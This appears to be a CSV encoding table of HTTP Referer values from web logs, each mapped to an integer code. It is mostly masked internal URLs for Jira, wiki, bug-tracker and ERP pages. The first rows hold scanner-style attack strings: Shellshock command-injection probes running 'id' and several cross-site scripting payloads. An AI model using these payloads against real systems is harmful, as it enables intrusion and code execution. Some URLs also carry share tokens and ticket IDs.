httpReferer,encoder,mode_is
"'""()&%<acx><ScRiPt >V6sf(9994)</ScRiPt>",0,0
() { OpenVAS-VT:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;,1,0
() { _; OpenVAS-VT; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; },2,0
"*/-->'""></iframe></script></style></title></textarea><script >alert(15378)</script>",3,0
"*/-->'""></iframe></script></style></title></textarea><script >alert(62920)</script>",4,0
"*/-->'""></iframe></script></style></title></textarea><script >alert(78168)</script>",5,0
Nan,6,1
bGlua2Fub3Ztb3dtcnVzNA==,7,0
http://*..163.com/jiankang/article_cambrian/F53JFOB1053469KO.html,8,0
http://*.139.73.*:8080/Web_sc/login.gn,9,0
http://*.150.39.*/,10,0
http://*.150.39.*/content/layui/css/layui.css,11,0
http://*.150.39.*/login,12,0
http://*.153.4.*/?<script>cross_site_scripting.nasl</script>,13,0
http://*.16.20.*/env/1a48987/apps/add-balancer?serviceId=1s2136&stackId=1st597&upgrade=true,14,0
http://*.168.19.*/index.html,15,0
http://*.168.19.*/static/css/app.03ca5a15b4adbb2519200bedaef35d84.css,16,0
http://*.168.21.*/zentao/bug-resolve-1528.html?onlybody=yes,17,0
http://*.168.3.*/U9/erp/display.aspx?lnk=CBO.Pub.Customer.CustomerList&sId=3000nid&bId=1001101159162177&ShowType=NavigatePage&ParentForm=c60a3c61-932c-45f9-9745-162e0807d1c9&__fsk=__SK93959*__SK93959&__curOId=1001712070000049&ID=1001801150123558,18,0
http://*.168.3.*/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101159162183&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK62762*__SK62762&__curOId=1001712070000049,19,0
http://*.168.3.*/U9/erp/display.aspx?lnk=SCM.SD.SDA010_20&sId=3015nid&bId=1001101160311911&ShowType=NavigatePage&ParentForm=7dde4c9d-98a2-4bb1-bc42-bccd74e4e1ac&__fsk=__SK73144*__SK73144&__curOId=1001712070000049,20,0
http://*.168.3.*/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK7514&__curOId=1001712070000049&layerId=10endLayerId,21,0
http://*.168.3.*/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=d56ab174-95c7-4462-8e59-6c318c0d626d&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&IsMultiRefTag=True&__sk=__SK83655&__curOId=1001712070000049&layerId=7endLayerId,22,0
http://*.168.3.*/pages/viewpage.action?pageId=42500099,23,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=&id=42932&popup=true&nextUrl=%2Fqm%2Fbug%2FbugAction.do%3Faction%3DgetBugDetail%26id%3D42932%26popup%3Dtrue,24,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=36354,25,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=39807,26,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=PersonalBug_assignee&id=43010,27,0
http://*.168.31.*/depot/ticket/index/ticketIdentification/FEGSY-XZ6KA-VRTEQ-W76JR-WSWF6,28,0
http://*.168.31.*/depot/ticket/index/ticketIdentification/U2CNK-CF5P6-TVHDW-84PFT-UL35H,29,0
http://*.168.31.*/zentao/bug-create-6-0-moduleID=354.html,30,0
http://*.168.31.*/zentao/bug-resolve-1199.html?onlybody=yes,31,0
http://*.168.34.*/expert/,32,0
http://*.168.34.*/screen/,33,0
http://*.168.38.*:8081/,34,0
http://*.178.79.*:30018/map/Apps/Sandcastle/dianzishapan/dianzishapan.html,35,0
http://*.20.120.*:18120/,36,0
http://*.20.120.*:18120/login,37,0
http://*.20.128.*/emer/,38,0
http://*.20.128.*/screen/,39,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2725&onlybody=yes,40,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2727&onlybody=yes,41,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2728&onlybody=yes,42,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2733&onlybody=yes,43,0
http://*.20.152.*/xiaojunjie/redteam-exploits/tree/master/exploits/networks/security,44,0
http://*.20.152.*/xiaojunjie/redteam-exploits/tree/master/exploits/networks/security/officescan,45,0
http://*.20.152.*/xiaojunjie/redteam-exploits/tree/master/exploits/networks/web/mail2k,46,0
http://*.20.28.*/,47,0
http://*.20.28.*/images/apache_pb.gif,48,0
http://*.20.28.*/login/,49,0
http://*.20.28.*/noindex/css/bootstrap.min.css,50,0
http://*.20.28.*/screen/,51,0
http://*.20.3.*:8080/xkefu/jabber.jsp,52,0
http://*.20.86.*:1002/knowledge/publish,53,0
http://*.236.191.*:7080/zsdypt/certificate.jsp?1=1&ticket=ff808081707ce50401707f1ea2bd6903-ticket,54,0
http://*.50.2.*/jira/browse/BDSAP-181,55,0
http://*.50.2.*/jira/browse/CUS-41,56,0
http://*.50.2.*/jira/browse/CUS-43,57,0
http://*.50.2.*/jira/issues/?filter=-2,58,0
http://*.50.2.*/jira/issues/?filter=-7,59,0
http://*.50.2.*/jira/issues/?filter=10309,60,0
http://*.50.2.*/jira/projects/AVDEV?selectedItem=com.atlassian.jira.jira-projects-plugin:report-page,61,0
http://*.50.2.*/jira/projects/BAAS/issues/BAAS-18?filter=myopenissues,62,0
http://*.50.2.*/jira/projects/CUS/issues/CUS-17?filter=allopenissues,63,0
http://*.50.2.*/jira/projects/CUS/versions/10502,64,0
http://*.50.2.*/jira/projects/CUS?selectedItem=com.atlassian.jira.jira-projects-plugin:release-page,65,0
http://*.50.2.*/jira/projects/IMP/issues,66,0
http://*.50.2.*/jira/projects/IMP/issues/IMP-287?filter=allopenissues,67,0
http://*.50.2.*/jira/secure/Dashboard.jspa,68,0
http://*.50.2.*/jira/secure/Dashboard.jspa?selectPageId=10300,69,0
http://*.50.2.*/wiki/,70,0
http://*.50.2.*/wiki/display/AIL,71,0
http://*.50.2.*/wiki/display/BDSAP/2020.01.09+v3.5+M2,72,0
http://*.50.2.*/wiki/display/BDSAP/2020.01.09+v3.5+M2?src=contextnavpagetreemode,73,0
http://*.50.2.*/wiki/display/BaaS,74,0
http://*.50.2.*/wiki/display/BaaS/2020.02.*,75,0
http://*.50.2.*/wiki/pages/diffpagesbyversion.action?pageId=12746803&selectedPageVersions=38&selectedPageVersions=37,76,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12156958&draftShareId=2ffa1dcc-8b50-40e1-886c-9ecc569d8584,77,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12746780&draftShareId=91dce2d3-a090-4809-b76e-405385116ef9,78,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12746852&draftShareId=087ba6d5-acb7-47b2-8aaf-8b2bb6211227,79,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12747305&draftShareId=840253b9-d234-487e-92e8-cd3ef3871624,80,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12749764&draftShareId=644ea09f-f8b8-49ea-a825-ead49cb88b20,81,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750493&draftShareId=0c419d2e-75c9-4671-b504-fad846785cc0,82,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750582&draftShareId=6bb5629a-7ab5-4fd4-af29-f081053e10e8,83,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750650&draftShareId=2ce81514-a7d0-44ec-a9d3-2244644ba9b0,84,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750736&draftShareId=394c0494-50e0-481e-ac75-ccc42b7f480d,85,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750758&draftShareId=a6ff9123-c486-4c89-9662-d29ee06b58c8,86,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750819&draftShareId=58022050-52aa-4b6b-a26a-23ac7523b161,87,0
